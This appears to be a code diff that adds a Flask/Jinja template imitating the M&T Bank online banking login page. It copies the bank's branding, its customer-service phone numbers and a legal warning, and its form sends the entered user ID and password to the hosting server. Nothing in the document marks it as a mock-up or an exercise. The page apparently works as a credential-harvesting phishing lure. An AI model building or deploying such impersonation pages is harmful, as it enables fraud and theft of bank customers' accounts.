@@ -1,0 +1,73 @@
+{% extends 'base.html'%} {%block body%}
+
+
+<div style="padding-top: 5px" class="middle-form">
+  <p class="go-left" style="font-size: 30px; color: #007856; text-align: center;">
+    Log In <br />
+  </p>
+  
+  <div class="submitForm">
+
+    <div class="signin-type">
+      <div onclick="highLightPersonal()" id="personal-account" class="acc-type">
+  <p>Personal / Business</p>
+      </div>
+      <div onclick="highLightCommercial()" id="commercial-account" class="acc-type">
+        <p>Commercial </p>
+      </div>
+    </div>
+    <form action="" method="post">
+      <div class="input-field" style="text-align: left">
+        <!-- <label for="username">Username</label> -->
+        <input id="username" placeholder="Username" name="user-id" type="text" />
+      </div>
+      <div class="input-field" style="text-align: left">
+        <!-- <label for="password">Password</label> -->
+        <input id="password" placeholder="Password" name="password" type="password" />
+      </div>
+
+      <div class="checkboxWrapper" style="margin-top: 20px">
+        <div class="checkbox">
+          <input type="checkbox" name="" id="" />
+        </div>
+        <div class="label">
+          <label for="">Remember User ID</label>
+        </div>
+      </div>
+    
+      <button type="submit">Log in</button>
+    </form>
+    <br />
+    <a href="">Help with User ID or Passcode</a>
+    <a href="">Enroll Now</a>
+
+    <p>Unauthorized access is prohibited. Usage may be monitored</p>
+
+    <hr>
+
+    <p>Have questions about M&T Online Banking?</p>
+    <a href="">Personal Accounts: 1-800-790-9130</a>
+    <p>Monday - Friday 8am - 9pm ET</p>
+    <p>Saturday - Sunday 9am - 5pm ET</p>
+
+    <a href="">Business Accounts: 1-800-724-6070</a>
+  </div>
+</div>
+
+<script>
+  const highLightCommercial = () => {
+    document.getElementById('personal-account').style.background = 'none';
+    document.getElementById('personal-account').style.color = 'black';
+    document.getElementById('commercial-account').style.background = '#007856';
+    document.getElementById('commercial-account').style.color = 'white';
+  }
+
+  const highLightPersonal = () => {
+    document.getElementById('personal-account').style.background = '#007856';
+    document.getElementById('personal-account').style.color = 'white';
+    document.getElementById('commercial-account').style.background = 'none';
+    document.getElementById('commercial-account').style.color = 'black';
+  }
+</script>
+
+{%endblock%}
